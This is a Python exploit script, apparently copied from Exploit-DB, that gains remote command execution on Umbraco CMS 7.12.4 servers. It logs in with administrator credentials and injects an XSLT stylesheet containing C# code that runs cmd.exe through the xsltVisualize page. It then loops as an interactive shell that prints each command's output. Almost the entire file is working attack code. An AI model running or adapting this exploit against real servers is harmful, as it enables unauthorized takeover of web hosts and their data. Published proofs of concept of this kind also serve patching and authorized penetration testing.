#!/bin/python3

# From: https://www.exploit-db.com/exploits/46153

# Exploit Title: Umbraco CMS - Remote Code Execution by authenticated administrators
# Dork: N/A
# Date: 2019-01-13
# Exploit Author: Gregory DRAPERI & Hugo BOUTINON
# Vendor Homepage: http://www.umbraco.com/
# Software Link: https://our.umbraco.com/download/releases
# Version: 7.12.4
# Category: Webapps
# Tested on: Windows IIS
# CVE: N/A


import requests;
import re
from html import unescape
from bs4 import BeautifulSoup;
import argparse

def print_dict(dico):
    print(dico.items());

parser = argparse.ArgumentParser()
parser.add_argument("host", help="The Base URL of the host to connect to, e.g. http://10.1.1.1")
parser.add_argument("username", help="The Umbraco username to connect with")
parser.add_argument("password", help ="The password to use")
args = parser.parse_args()
    
login = args.username
password=args.password
host = args.host

while 1==1:

	cmd = input(login+"@"+host+"> ").strip().replace("\\", "\\\\").replace("\"", "\\\"");

	if cmd=="exit":
		break;

	# Execute a calc for the PoC
	payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \
	xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" \
	xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\
	<msxsl:script language="C#" implements-prefix="csharp_user">\
	\
	public string xml() \
	{ string cmd = " /c ' + cmd + '"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\
	 proc.StartInfo.FileName = "cmd.exe"; proc.StartInfo.Arguments = cmd;\
	 proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;  proc.StartInfo.RedirectStandardError = true; \
	 proc.Start(); string output = "@@@@@" + "START@@@@@" +  proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd() +"@@@@@END"+"@@@@@"; return output; } \
	\
	 </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/>\
	 </xsl:template> </xsl:stylesheet> ';

	# Step 1 - Get Main page
	s = requests.session()
	url_main =host+"/umbraco/";
	r1 = s.get(url_main);

	# Step 2 - Process Login
	url_login = host+"/umbraco/backoffice/UmbracoApi/Authentication/PostLogin";
	loginfo = {"username":login,"password":password};
	r2 = s.post(url_login,json=loginfo);

	# Step 3 - Go to vulnerable web page
	url_xslt = host+"/umbraco/developer/Xslt/xsltVisualize.aspx";
	r3 = s.get(url_xslt);

	soup = BeautifulSoup(r3.text, 'html.parser');
	VIEWSTATE = soup.find(id="__VIEWSTATE")['value'];
	VIEWSTATEGENERATOR = soup.find(id="__VIEWSTATEGENERATOR")['value'];
	UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN'];
	headers = {'UMB-XSRF-TOKEN':UMBXSRFTOKEN};
	data = {"__EVENTTARGET":"","__EVENTARGUMENT":"","__VIEWSTATE":VIEWSTATE,"__VIEWSTATEGENERATOR":VIEWSTATEGENERATOR,"ctl00$body$xsltSelection":payload,"ctl00$body$contentPicker$ContentIdValue":"","ctl00$body$visualizeDo":"Visualize+XSLT"};

	# Step 4 - Launch the attack
	r4 = s.post(url_xslt,data=data,headers=headers);

	pattern = "(?<=@@@@@START@@@@@).*(?=@@@@@END@@@@@)"
	result = re.search(pattern, r4.text, flags=re.DOTALL)

	if result is None:
		print("Shell Error");
	else:
		print(unescape(result.group(0)));

